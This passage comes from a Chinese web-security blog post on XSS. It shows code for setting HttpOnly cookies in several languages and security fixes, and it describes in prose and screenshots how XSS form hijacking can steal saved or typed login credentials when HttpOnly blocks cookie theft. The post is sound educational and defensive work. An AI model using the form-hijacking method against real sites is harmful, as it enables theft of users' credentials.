+<h3 id="（2）C"><a href="#（2）C" class="headerlink" title="（2）C#"></a>（2）C#</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">&quot;myCookie&quot;</span>);   </span><br><span class="line">myCookie.HttpOnly = <span class="literal">true</span>;   </span><br><span class="line">Response.AppendCookie(myCookie); </span><br></pre></td></tr></table></figure>
+
+<h3 id="（3）VB-NET"><a href="#（3）VB-NET" class="headerlink" title="（3）VB.NET"></a>（3）VB.NET</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> myCookie <span class="keyword">As</span> HttpCookie = <span class="built_in">new</span> HttpCookie(<span class="string">&quot;myCookie&quot;</span>)   </span><br><span class="line">myCookie.HttpOnly = <span class="literal">True</span>   </span><br><span class="line">Response.AppendCookie(myCookie) </span><br></pre></td></tr></table></figure>
+
+<p>但是在 .NET 1.1 ,中您需要手动添加</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Cookies[cookie].Path += <span class="string">&quot;;HTTPOnly&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="（4）PHP≥5-2"><a href="#（4）PHP≥5-2" class="headerlink" title="（4）PHP≥5.2"></a>（4）PHP≥5.2</h3><p>&emsp;&emsp;PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly = </span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启： </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ini_set(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>); </span><br><span class="line"> <span class="comment">// or</span></span><br><span class="line">  session_set_cookie_params(<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>); </span><br><span class="line">setrawcookie(<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="（5）PHP4和PHP≤5-1"><a href="#（5）PHP4和PHP≤5-1" class="headerlink" title="（5）PHP4和PHP≤5.1"></a>（5）PHP4和PHP≤5.1</h3><p>&emsp;&emsp;对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了： </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  header(<span class="string">&quot;Set-Cookie: hidden=value; httpOnly&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h2 id="3、反制HttpOnly"><a href="#3、反制HttpOnly" class="headerlink" title="3、反制HttpOnly"></a>3、反制HttpOnly</h2><p>&emsp;&emsp;当对方开启HttpOnly时，盗取cookie就会失败。登录后台的方式有Cookie登录和账号密码登录</p>
+<h3 id="（1）Cookie形式"><a href="#（1）Cookie形式" class="headerlink" title="（1）Cookie形式"></a>（1）Cookie形式</h3><h3 id="（2）直接账号密码登录"><a href="#（2）直接账号密码登录" class="headerlink" title="（2）直接账号密码登录"></a>（2）直接账号密码登录</h3><h4 id="①-读取保存账号密码"><a href="#①-读取保存账号密码" class="headerlink" title="① 读取保存账号密码"></a>① 读取保存账号密码</h4><p>&emsp;&emsp;通过窃取保存在本地的数据（账号密码）来登录后台（需要xss产生于登录地址，利用表单劫持）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643474963043-18e133d0-6d66-45ab-acfd-0c560d64c2bd.png" alt="img"></p>
+<p>&emsp;&emsp;type、id、name通过查看网站源代码中的登录框表单</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643474953262-42089fde-8883-4c26-b970-e08748b7e799.png" alt="img"></p>
+<h4 id="②-读取没保存账号密码"><a href="#②-读取没保存账号密码" class="headerlink" title="② 读取没保存账号密码"></a>② 读取没保存账号密码</h4><p>&emsp;&emsp;通过表单（登录框）劫持数据（产生在后台的XSS，例如存储型XSS留言等）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643475025169-2a14e98f-1fb8-4ce6-a145-c62853f95eba.png" alt="img">    </p>
+<p>&emsp;&emsp;劫持原理：抓取数据包另外发送一份到跨站平台</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643475064941-75e7171d-7667-4c78-878f-7a82ef8f6f17.png" alt="img"></p>
+<p>&emsp;&emsp;但是如果是https网站的话，数据是进行了ssl加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法。</p>
+<h1 id="九、安全修复方案"><a href="#九、安全修复方案" class="headerlink" title="九、安全修复方案"></a>九、安全修复方案</h1><ul>
+<li><p>开启HttpOnly</p>
+</li>
+<li><p>过滤输入：对输入进行过滤，不允许可能导致XSS攻击的字符输入</p>
+</li>
+<li><p>过滤输出：根据输出点的位置对输出到前端的内容进行适当转义</p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">w01ke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wolke.cn/post/e0b257ee.html">https://wolke.cn/post/e0b257ee.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wolke.cn" target="_blank">wolke</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a></div><div class="post_share"><div class="social-share" data-image="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/20180929165919I3N.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/c970015a.html"><img class="prev-cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/20180929165919I3N.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XSS的Waf绕过及工具使用</div></div></a></div><div class="next-post pull-right"><a href="/post/76a6120c.html"><img class="next-cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220114192152268.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">深度学习基础——什么是深度学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/c970015a.html" title="XSS的Waf绕过及工具使用"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/20180929165919I3N.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-30</div><div class="title">XSS的Waf绕过及工具使用</div></div></a></div><div><a href="/post/a645df71.html" title="PHP检查相等时的漏洞"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/5d84417ee7ad0520.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">PHP检查相等时的漏洞</div></div></a></div><div><a href="/post/ec694927.html" title="Web搭建安全拓展"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079973928-8f4489b2-ca0e-4103-a1cf-6ae69e253f8d.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">Web搭建安全拓展</div></div></a></div><div><a href="/post/488cc6a6.html" title="Web数据包拓展"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582307082-e666f24e-a7ac-4d99-b3df-abdaa21068c7.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-03</div><div class="title">Web数据包拓展</div></div></a></div><div><a href="/post/de8a59bf.html" title="Web源码拓展"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009190194-959ddb49-0e3e-4e9c-824e-8356fe945d9c.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">Web源码拓展</div></div></a></div><div><a href="/post/57602181.html" title="加密编码算法"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631426783155-a2d53afe-f8c2-4f8e-b5f8-fedc743a8f62.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">加密编码算法</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E"><span class="toc-text">一、XSS跨站漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89XSS%E7%AE%80%E4%BB%8B"><span class="toc-text">（1）XSS简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E4%BA%A7%E7%94%9F%E5%B1%82%E9%9D%A2"><span class="toc-text">（2）产生层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%87%BD%E6%95%B0%E7%B1%BB"><span class="toc-text">（3）函数类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%8D%B1%E5%AE%B3%E5%BD%B1%E5%93%8D"><span class="toc-text">（4）危害影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="toc-text">（5）浏览器内核版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%B8%B8%E5%87%BA%E7%8E%B0%E5%9C%BA%E6%99%AF"><span class="toc-text">（6）常出现场景</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">二、XSS攻击的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%9D%A5%E8%87%AA%E5%86%85%E9%83%A8%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">（1）来自内部的攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%9D%A5%E8%87%AA%E5%A4%96%E9%83%A8%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">（2）来自外部的攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81XSS%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">三、XSS的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">1、反射型(非持久化)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86"><span class="toc-text">（1）原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-text">（2）攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="toc-text">（3）判断是否存在反射型xss漏洞并利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%88%A4%E6%96%AD%E6%9C%89%E6%B2%A1%E6%9C%89%E8%BF%87%E6%BB%A4%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-text">① 判断有没有过滤一些特殊的字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-text">② 注入代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E6%8F%92%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-text">③ 插入代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3-%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E"><span class="toc-text">④ 利用xss漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8B-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">2、存储型(持久化)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86-1"><span class="toc-text">（1）原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-1"><span class="toc-text">（2）攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89payload"><span class="toc-text">（3）payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81DOM%E5%9E%8B"><span class="toc-text">3、DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86-2"><span class="toc-text">（1）原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-2"><span class="toc-text">（2）攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89payload-1"><span class="toc-text">（3）payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81XSS%E6%94%BB%E5%87%BB%E7%9A%84%E9%80%94%E5%BE%84"><span class="toc-text">四、XSS攻击的途径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-text">五、靶场实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81PHP%E5%BC%80%E6%BA%90%E5%A4%9A%E5%8A%9F%E8%83%BD%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-text">1、PHP开源多功能留言板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA"><span class="toc-text">（1）搭建靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89XSS%E5%B9%B3%E5%8F%B0"><span class="toc-text">（2）XSS平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-text">（3）进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-text">① 初次尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E7%BB%95%E8%BF%87-lt-script-gt-%E6%A3%80%E6%B5%8B"><span class="toc-text">② 绕过&lt;script&gt;检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E5%88%A9%E7%94%A8XSS%E5%B9%B3%E5%8F%B0%E8%8E%B7%E5%8F%96cookie"><span class="toc-text">③ 利用XSS平台获取cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3-%E4%BD%BF%E7%94%A8firebug%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">④ 使用firebug登录后台</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81BUUCTF-basic-BUU-XSS-COURSE-1"><span class="toc-text">2、BUUCTF-basic-BUU XSS COURSE 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%AE%A2%E5%8D%95%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%9B%E9%94%8B%E7%9C%9F%E4%BA%BACS%E9%87%8E%E6%88%98123"><span class="toc-text">3、订单系统——军锋真人CS野战123</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD"><span class="toc-text">（1）靶场下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85"><span class="toc-text">（2）靶场安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB-1"><span class="toc-text">（3）进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95-1"><span class="toc-text">① 初次尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-XSS%E5%B9%B3%E5%8F%B0%E8%8E%B7%E5%8F%96cookie"><span class="toc-text">② XSS平台获取cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-postman%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">③ postman登录后台</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89Beef%E7%BB%93%E5%90%88XSS%E6%94%BB%E5%87%BB"><span class="toc-text">（4）Beef结合XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%AE%89%E8%A3%85Beef-xss"><span class="toc-text">① 安装Beef-xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E4%BD%BF%E7%94%A8beef-xss"><span class="toc-text">② 使用beef-xss</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81WebShell%E7%AE%B1%E5%AD%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-text">4、WebShell箱子管理系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">（1）搭建靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD"><span class="toc-text">① 靶场下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E5%B0%8F%E6%97%8B%E9%A3%8E%E4%B8%8B%E8%BD%BD"><span class="toc-text">② 小旋风下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-text">③ 靶场搭建</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-text">（2）进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E6%A8%A1%E6%8B%9Fwebshell%E5%8E%9F%E4%BD%9C%E8%80%85%E8%BF%9B%E8%A1%8C%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB"><span class="toc-text">① 模拟webshell原作者进行后门攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E5%8F%8D%E6%9D%80webshell%E5%8E%9F%E4%BD%9C%E8%80%85"><span class="toc-text">② 反杀webshell原作者</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E4%BD%BF%E7%94%A8JS%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96Cookie"><span class="toc-text">5、使用JS代码获取Cookie</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS%E6%94%BB%E5%87%BB%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="toc-text">六、XSS攻击的检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E8%8E%B7%E5%8F%96Session%E6%80%9D%E8%B7%AF"><span class="toc-text">七、获取Session思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81HttpOnly"><span class="toc-text">八、HttpOnly</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFHttpOnly"><span class="toc-text">1、什么是HttpOnly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81HttpOnly%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%A0%B7%E4%BE%8B"><span class="toc-text">2、HttpOnly的设置样例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89JavaEE"><span class="toc-text">（1）JavaEE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89C"><span class="toc-text">（2）C#</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89VB-NET"><span class="toc-text">（3）VB.NET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89PHP%E2%89%A55-2"><span class="toc-text">（4）PHP≥5.2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89PHP4%E5%92%8CPHP%E2%89%A45-1"><span class="toc-text">（5）PHP4和PHP≤5.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%8F%8D%E5%88%B6HttpOnly"><span class="toc-text">3、反制HttpOnly</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Cookie%E5%BD%A2%E5%BC%8F"><span class="toc-text">（1）Cookie形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%9B%B4%E6%8E%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-text">（2）直接账号密码登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E8%AF%BB%E5%8F%96%E4%BF%9D%E5%AD%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">① 读取保存账号密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E8%AF%BB%E5%8F%96%E6%B2%A1%E4%BF%9D%E5%AD%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">② 读取没保存账号密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-text">九、安全修复方案</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By w01ke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><script type="text/javascript">document.write(unescape("%3Cspan id='cnzz_stat_icon_1280658241'%3E%3C/span%3E%3Cscript src='https://s9.cnzz.com/z_stat.php%3Fid%3D1280658241%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script></div><div class="icp"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="/img/gongan.png"/><span>赣ICP备2021004623号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
+      appKey: 'nQR603PJj8t2qUQiGTSeqXrB',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: {
+          "Heybox2": "Heybox/expression_cube_bingbujiandan.png",
